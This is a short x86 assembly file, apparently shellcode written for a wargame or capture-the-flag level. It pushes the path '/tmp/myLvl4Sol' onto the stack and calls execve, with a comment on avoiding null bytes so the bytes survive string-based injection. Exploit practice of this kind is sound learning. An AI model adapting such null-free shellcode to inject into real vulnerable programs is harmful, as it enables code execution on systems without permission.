section .text

global _start
_start:
  push 0x00000072     
  push 0x772f6c6f     
  push 0x53346c76
  push 0x4c796d2f
  push 0x706d742f

  mov ebx, esp        ; ebx -> '/tmp/myLvl4Sol'
  xor ecx, ecx        ; argv = NULL
  xor edx, edx        ; envp = NULL
; mov eax, 11 		bad because results in null bytes in shellcode
  xor eax, eax         ; syscall = execve
  xor eax, 11
  int 0x80
